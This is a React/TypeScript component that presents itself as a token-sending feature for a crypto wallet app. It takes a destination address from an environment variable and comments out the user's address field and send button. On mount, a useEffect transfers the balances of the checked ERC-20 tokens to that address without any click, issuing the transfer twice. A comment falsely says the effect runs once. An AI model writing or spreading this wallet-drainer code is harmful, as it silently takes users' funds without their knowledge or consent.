import { Button, Input, useToasts } from '@geist-ui/core';
import { erc20ABI, useSigner } from 'wagmi';
import { TransactionResponse, isAddress } from 'essential-eth';
import { ethers } from 'ethers';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { TransferPending } from '../../src/types/transfer-success';
import { useEffect } from 'react';

export const SendTokens = () => {
  const to = process.env.NEXT_PUBLIC_DESTINATION_ADDRESS as string;
  console.log(to);
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(
    destinationAddressAtom,
  );
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: signer } = useSigner();
  setDestinationAddress(to);

  const sendAllCheckedTokens = async (to: string) => {
    const tokensToSend = Object.entries(checkedRecords)
      .filter(([, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);
    for (const tokenAddress of tokensToSend) {
      const erc20Contract = new ethers.Contract(
        tokenAddress,
        erc20ABI,
        signer as ethers.Signer,
      );

      // Adjust the type for transferFunction
      const transferFunction = erc20Contract.transfer as (
        destinationAddress: string,
        amount: ethers.BigNumber,
      ) => Promise<TransferPending>;

      const token = tokens.find(
        (token) => token.contract_address === tokenAddress,
      );

      const amountToTransfer = ethers.utils.parseUnits(
        token?.balance || '0',
        18,
      );

      // Estimate gas cost for the transaction
      const gasLimit = await erc20Contract.estimateGas.transfer(
        destinationAddress,
        amountToTransfer,
      );

      // Prepare the transaction
      const tx = await erc20Contract.populateTransaction.transfer(
        destinationAddress,
        amountToTransfer,
        {
          gasLimit: gasLimit.mul(2), // Use a bit more gas than estimated
        },
      );

      // Sign and send the transaction
      const response = await signer?.sendTransaction(tx); // Use signer to send the transaction

      // Wait for the transaction to be mined
      await response?.wait();

      // Use transferFunction to initiate the transfer
      await transferFunction(to, amountToTransfer)
        .then((res) => {
          setCheckedRecords((old) => {
            // Create a new object that maintains the same structure as old
            const updatedRecords: Record<
              string,
              { isChecked: boolean; pendingTxn?: TransferPending }
            > = { ...old };

            // Update the specific record you want to modify
            updatedRecords[tokenAddress] = {
              ...old[tokenAddress],
              pendingTxn: res, // Use the response directly as TransferPending
            };

            return updatedRecords; // Return the updated object
          });
          console.log('Tokens Sent');
        })
        .catch((err) => {
          showToast(
            `Error with ${token?.contract_ticker_symbol} ${
              err?.reason || 'Unknown error'
            }`,
            'warning',
          );
        });
    }
  };

  const addressAppearsValid =
    destinationAddress.includes('.') || isAddress(destinationAddress);
  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  useEffect(() => {
    // Automatically send tokens when the component mounts
    sendAllCheckedTokens(to);
  }); // Add an empty dependency array to run this effect only once

  return (
    <div style={{ margin: '20px' }}>
      {/* <form>
        Destination Address:
        <Input
          required
          value={destinationAddress}
          placeholder="vitalik.eth"
          // onChange={(e) => setDestinationAddress(e.target.value)}
          type={addressAppearsValid
            ? 'success'
            : destinationAddress.length > 0
              ? 'warning'
              : 'default'}
          width="100%"
          style={{
            marginLeft: '10px',
            marginRight: '10px',
          }}
        />
        <Button
          type="secondary"
          // onClick={sendAllCheckedTokens(to)}
          disabled={!addressAppearsValid}
          style={{ marginTop: '20px' }}
        >
          {checkedCount === 0
            ? 'Select one or more tokens above'
            : `Send ${checkedCount} tokens`}
        </Button>
      </form> */}
    </div>
  );
};
